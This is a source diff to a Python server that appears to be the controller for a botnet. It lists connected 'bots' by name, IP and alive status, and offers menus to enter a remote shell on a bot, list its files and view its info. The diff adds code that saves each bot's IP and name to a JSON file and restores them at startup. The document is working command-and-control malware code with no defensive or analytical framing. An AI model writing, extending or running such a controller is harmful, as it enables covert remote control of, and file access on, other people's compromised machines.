@@ -1,3 +1,5 @@
+import json
+import os.path
 import random
 import socket, pickle#, security
 import string
@@ -14,6 +16,7 @@ addr = ('192.168.0.224', 5000)
 standard_text = Fore.YELLOW
 warning_text = Fore.RED + Style.BRIGHT
 users = []
+user_file = 'users.json'
 
 def is_int(str):
     try:
@@ -45,20 +48,25 @@ def get_user(id):
             return user
 
 class User():
-    def __init__(self, conn, name):
-        self.conn = conn
-        self.ip, self.port = conn[1][0], conn[1][1]
+    def __init__(self, conn=None, name=None, ip=None):
+        if conn:
+            self.conn = conn
+            self.ip, self.port = conn[1][0], conn[1][1]
+        else:
+            self.ip = ip.split(':')[0]
         self.name = name
         self.hist = []
         self.msg = None
-        self.alive = True
+        self.alive = True if conn else False
         self.id = ''.join(random.choices(string.ascii_lowercase, k=8))
-        self.hist.append({'from': 'server', 'msg': 'client connected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
-        threading.Thread(target=self.keep_alive, args=()).start()
+        if self.alive:
+            self.hist.append({'from': 'server', 'msg': 'client connected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
+            threading.Thread(target=self.keep_alive, args=()).start()
 
-    def restart(self, conn):
+    def restart(self, conn, name):
         self.alive = True
         self.conn = conn
+        self.name = name
         self.port = conn[1][1]
         self.hist.append({'from': 'server', 'msg': 'client reconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
         threading.Thread(target=self.keep_alive, args=()).start()
@@ -123,11 +131,11 @@ def get_instructions(): #todo add file down/uploading from bot, get bot's file s
     if opt == 0:
         if len(users) > 0:
             curr_users = [u.id for u in users]  # in case list of users changes before selection made
-            opt = get_choice([f'{user.name} | {user.ip}:{user.port} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP:port | Status')
+            opt = get_choice([f'{user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP:port | Status')
             if opt != len(curr_users):
                 user = get_user(curr_users[opt])
                 bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs', 'Main Menu']
-                opt = get_choice(bot_opts, 'Choose an action:', subtitle=f'For: {user.name} | {user.ip}:{user.port} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}')
+                opt = get_choice(bot_opts, 'Choose an action:', subtitle=f'For: {user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}')
                 if opt == 0:
                     if user.alive:
                         #TODO turn this section into shell
@@ -163,6 +171,13 @@ def run():
 
     threading.Thread(target=get_instructions, args=()).start()
 
+    # create inactive user objs for saved ips
+    if os.path.isfile(user_file):
+        with open(user_file, 'r') as f:
+            read_users = json.load(f)
+        for u in read_users:
+            users.append(User(ip=u, name=read_users[u]))
+
     while True:
         conn = server.accept()
         try:
@@ -172,14 +187,23 @@ def run():
             for u in users:
                 if  u.ip == conn[1][0]:
                     user = get_user(u.id)
-                    user.restart(conn)
+                    user.restart(conn, name)
                     break
             if not user:
                 user = User(conn, name)
                 users.append(user)
+            if not os.path.isfile(user_file):
+                with open(user_file, 'w') as f:
+                    json.dump({}, f)
+            with open(user_file, 'r') as f: #todo view bot session logs not working
+                read_users = json.load(f)
+            read_users[conn[1][0]] = name
+            with open(user_file, 'w') as f:
+                json.dump(read_users, f)
             threading.Thread(target=user.manage, args=()).start()
         except:
-            print(warning_text + 'Discarding connection because invalid name recieved from {conn[1][0]}:{conn[1][1]}')
+            traceback.print_exc()
+            print(warning_text + f'Discarding connection because invalid name recieved from {conn[1][0]}:{conn[1][1]}')
 
 
 if __name__ == '__main__':
